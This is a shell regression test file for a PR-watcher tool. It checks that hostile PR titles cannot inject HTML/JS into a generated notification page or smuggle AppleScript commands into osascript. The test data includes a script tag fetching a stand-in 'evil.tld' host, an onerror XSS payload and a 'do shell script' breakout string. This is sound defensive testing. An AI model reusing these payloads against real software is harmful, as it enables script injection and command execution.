#!/usr/bin/env bats
# Regression tests for the two injection fixes. If any of these fail, an
# attacker-controlled PR title can once again inject HTML/JS or AppleScript.
load test_helper

seed_merged() {
  echo '{"prs":["https://github.com/o/r/pull/42"]}' > "$HOME/.pr-watcher/config.json"
  export GH_PR_JSON="$(jq -nc --arg t "$1" \
    '{state:"MERGED",mergedAt:"2026-07-05T10:00:00Z",title:$t,number:42}')"
}

@test "PR title cannot inject a live <script> into the celebration page" {
  seed_merged '</p><script>fetch("https://evil.tld/x")</script><p>'
  pr-watcher --force
  [ -f "$HOME/.pr-watcher/notify-42.html" ]
  ! grep -q '<script>fetch' "$HOME/.pr-watcher/notify-42.html"
  grep -q '&lt;script&gt;fetch' "$HOME/.pr-watcher/notify-42.html"
}

@test "PR title cannot inject an <img onerror=> handler" {
  seed_merged '"><img src=x onerror=alert(1)>'
  pr-watcher --force
  ! grep -q '<img src=x' "$HOME/.pr-watcher/notify-42.html"
}

@test "notification passes the title as a single osascript argument (no -e source interpolation)" {
  local payload='" & (do shell script "touch '"$BATS_TEST_TMPDIR"'/PWNED") & "'
  seed_merged "$payload"
  pr-watcher --force
  # Our osascript stub records each argv entry on its own line. The full payload
  # must arrive as ONE argument (i.e. it was passed as data, not compiled as code).
  grep -Fq "arg=#42 — $payload" "$STUB_LOG/osascript.argv"
  # And nothing executed.
  [ ! -e "$BATS_TEST_TMPDIR/PWNED" ]
}

@test "guard: no untrusted variable is interpolated into an 'osascript -e' string" {
  run grep -REn 'osascript -e "[^"]*\$\{?(title|url|label|selected|number|safe_title|clip)' "$REPO/bin"
  [ "$status" -ne 0 ]
}

@test "guard: pr-watcher renders TITLE through html_escape, not raw sed" {
  grep -q 'TITLE.*html_escape' "$REPO/bin/pr-watcher"
  ! grep -q 's|{{TITLE}}|' "$REPO/bin/pr-watcher"
}

@test "guard: every script sets a restrictive umask or writes no state" {
  # Scripts that touch ~/.pr-watcher must set umask 077 (0600 files).
  for f in pr-watcher pr-watcher-add pr-watcher-add-url pr-watcher-remove pr-watcher-remove-url; do
    grep -q '^umask 077' "$REPO/bin/$f" || {
      echo "missing 'umask 077' in bin/$f"; return 1;
    }
  done
}
